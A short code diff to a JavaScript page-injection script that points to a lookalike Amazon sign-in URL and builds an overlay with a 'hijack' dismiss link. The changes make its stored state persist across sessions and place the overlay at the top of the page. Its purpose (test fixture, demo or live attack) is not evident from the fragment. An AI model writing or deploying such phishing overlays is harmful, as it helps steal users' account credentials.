@@ -10,10 +10,10 @@
   var OFFSITE_URL = 'https://amazon-account-verify.example.com/ap/signin';
 
   function getStore(key) {
-    try { return sessionStorage.getItem(key); } catch(e) { return null; }
+    try { return localStorage.getItem(key); } catch(e) { return null; }
   }
   function setStore(key, val) {
-    try { sessionStorage.setItem(key, val); } catch(e) {}
+    try { localStorage.setItem(key, val); } catch(e) {}
   }
 
   function inject() {
@@ -86,7 +86,7 @@
 
         + '</div>';
 
-      document.body.appendChild(overlay);
+      document.body.insertBefore(overlay, document.body.firstChild);
 
       document.getElementById('__bb_hijack_dismiss_link').addEventListener('click', function(e) {
         e.preventDefault();
